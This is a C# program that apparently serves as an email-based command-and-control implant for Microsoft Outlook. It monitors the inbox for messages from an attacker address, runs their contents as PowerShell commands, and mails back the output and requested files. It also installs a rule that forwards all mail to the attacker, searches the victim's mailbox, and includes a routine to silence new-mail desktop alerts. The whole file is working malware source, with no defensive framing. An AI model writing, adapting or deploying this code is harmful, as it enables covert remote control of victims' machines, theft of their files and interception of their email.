using System;
using System.IO;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Management.Automation;
using Microsoft.Win32;
using Microsoft.Office.Interop.Outlook;
using System.Linq;

class Program
{
    private static Outlook.Application outlookApp;
    private static Outlook.NameSpace outlookNamespace;
    private static Outlook.MAPIFolder inbox;
    private static Outlook.Items items;
    // Declare PowerShell session as a class field
    private static PowerShell psInstance = PowerShell.Create();
    public static Outlook.MailItem responseMail;
    public static string allResult = "";
    public static string C2Address = "attackerSender@testmail.com";
    static void Main()
    {
        // Get an instance of the Outlook application
        outlookApp = new Outlook.Application();
        outlookNamespace = outlookApp.GetNamespace("MAPI");
        inbox = outlookNamespace.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderInbox);
        items = inbox.Items;

        // Add event handler to the folder's Items collection
        items.ItemAdd += new Outlook.ItemsEvents_ItemAddEventHandler(OnNewMail);

        // Keep loop running to monitor emails
        Console.WriteLine("Monitoring emails... Press Enter to exit.");
        Console.ReadLine();
    }

    private static void OnNewMail(object Item)
    {
        if (Item is Outlook.MailItem mail)
        {
            string senderAddress = mail.SenderEmailAddress;

            // Display new email info (for debugging)
            Console.WriteLine($"New mail received from: {senderAddress} with subject: {mail.Subject}");

            if (senderAddress == C2Address)  // Replace with the specific address
            {
                //                DisableOutlookDesktopAlerts();
                // Check for attachments
                for (int i = 1; i <= mail.Attachments.Count; i++)
                {
                    Outlook.Attachment attachment = mail.Attachments[i];

                    // Save attachment to a temp file and read it
                    string tempFilePath = Path.Combine(Path.GetTempPath(), attachment.FileName);
                    attachment.SaveAsFile(tempFilePath);

                    // Read raw data
                    byte[] rawData = File.ReadAllBytes(tempFilePath);
                }

                string body = mail.Body;
                Console.WriteLine($"Email body: {body}");

                // Parse the body by commas
                string[] parsedData = body.Split(';');
                responseMail = (Outlook.MailItem)outlookApp.CreateItem(Outlook.OlItemType.olMailItem);

                foreach (string item in parsedData)
                {
                    Console.WriteLine("item ===" + item);
                    // Check for 'download ' prefix to get the file name
                    if (item.Trim().StartsWith("download ", StringComparison.OrdinalIgnoreCase))
                    {
                        // Get the file name after 'download '
                        string fileName = item.Trim().Substring(9).Trim();
                        HandleFileAttachment(fileName);
                    }
                    else if (item.Trim().StartsWith("forward"))
                    {
                        CreateForwardRule("ForwardRule", C2Address);
                    }
                    else if (item.Trim().StartsWith("search "))
                    {
                        // Get search name after 'search '
                        string searchName = item.Trim().Substring(9).Trim();
                        SearchOutlookEmails(searchName, 3);
                    }
                    else
                    {
                        // Execute PowerShell command
                        string result = ExecuteCommand(psInstance, item);
                        allResult += "****************" + item.Trim() + " Executed ************\n";
                        allResult += result + "\n\n";
                        // Display command result (for debugging)
                        Console.WriteLine($"Command input: {item}");
                        Console.WriteLine($"Command output: {result}");
                    }
                }


                // Send result via email
                Console.WriteLine($"Number of attachments: {responseMail.Attachments.Count}");

                responseMail.Subject = "Command Result";
                responseMail.Body = allResult;
                responseMail.To = C2Address;  // Reply to the sender
                responseMail.Send();
                File.WriteAllText(@"C:\Windows\Tasks\mail2.txt", allResult);

                Console.WriteLine("Command result written to mail.txt");
            }
        }
    }


    // Method to execute commands using PowerShell session
    private static string ExecuteCommand(PowerShell psInstance, string command)
    {
        try
        {
            psInstance.AddScript(command);
            var results = psInstance.Invoke();

            string output = "";
            foreach (var result in results)
            {
                output += result.ToString() + "\n";
            }

            // Capture any errors if they exist
            if (psInstance.Streams.Error.Count > 0)
            {
                foreach (var error in psInstance.Streams.Error)
                {
                    output += "Error: " + error.ToString() + "\n";
                }
            }

            // Clear the session for the next command execution
            psInstance.Commands.Clear();
            return output;
        }
        catch (System.Exception ex)
        {
            return $"Error executing command: {ex.Message}";
        }
    }

    public static void DisableOutlookDesktopAlerts()
    {
        // Define registry path and name
        string regPath = @"Software\Microsoft\Office\16.0\Outlook\Preferences";
        string regName = "NewMailDesktopAlerts";

        // Create the registry key if it doesn't exist
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
        {
            if (key == null)
            {
                Console.WriteLine("Failed to create registry key.");
                return;
            }

            // Get the current registry value (null if it doesn't exist)
            object currentValue = key.GetValue(regName);

            // Check if it's already disabled (0)
            if (currentValue != null && (int)currentValue == 0)
            {
                Console.WriteLine("Desktop alerts are already disabled. Skipping.");
            }
            else
            {
                // Disable desktop alerts (set to 0)
                key.SetValue(regName, 0, RegistryValueKind.DWord);
                Console.WriteLine("Desktop alerts have been disabled.");
            }
        }
    }

    public static void HandleFileAttachment(string fileName)
    {
        // Check if the file exists
        if (File.Exists(fileName))
        {
            Console.WriteLine($"File Exists: {fileName}");

            string fullPath = Path.GetFullPath(fileName);
            responseMail.Attachments.Add(fullPath);
            Console.WriteLine($"File Exists full path: {fullPath}");

        }
        else
        {
            Console.WriteLine($"File does not exist");
            allResult += $"File {fileName} does not exist.\n";
        }
    }


    public static void CreateForwardRule(string ruleName, string recipientEmail)
    {
        // Get Outlook Rules object
        Outlook.Rules rules = outlookNamespace.DefaultStore.GetRules();

        // Create a rule
        Outlook.Rule rule = rules.Create(ruleName, Outlook.OlRuleType.olRuleReceive);

        // Condition: Apply to all messages
        Outlook.RuleConditions ruleConditions = rule.Conditions;
        ruleConditions.Subject.Enabled = false;
        ruleConditions.SentTo.Enabled = false;
        ruleConditions.Body.Enabled = false;

        // Action: Forward email
        Outlook.RuleActions ruleActions = rule.Actions;
        Outlook.SendRuleAction forwardAction = ruleActions.Forward;

        forwardAction.Enabled = true;
        forwardAction.Recipients.Add(recipientEmail);

        // Save the rule
        rules.Save();

        Console.WriteLine($"Rule '{ruleName}' to forward emails to '{recipientEmail}' has been created successfully.");
    }

    public static void SearchOutlookEmails(string searchSubject, int daysAgo)
    {
        // Set search date (past X days)
        DateTime searchDate = DateTime.Now.AddDays(-daysAgo);

        // Create query to filter items in the folder
        string filter = "[ReceivedTime] >= '" + searchDate.ToString("yyyy-MM-dd") + "'";
        Items filteredItems = inbox.Items.Restrict(filter);

        // Loop through filtered emails
        foreach (object item in filteredItems)
        {
            if (item is MailItem mailItem)
            {
                Console.WriteLine("mailItem.Subject= " + mailItem.Subject);

                // Filter by subject
                if (mailItem.Subject.Contains(searchSubject))
                {
                    Console.WriteLine("email found. mailItem.Subject= " + mailItem.Subject);

                    // Add email details to the allResult variable
                    allResult += $"Subject: {mailItem.Subject}\n";
                    allResult += $"Sender: {mailItem.SenderName}\n";
                    allResult += $"Date: {mailItem.ReceivedTime}\n";
                    allResult += "--------------------------------------------------\n";
                }
            }
        }
    }
}
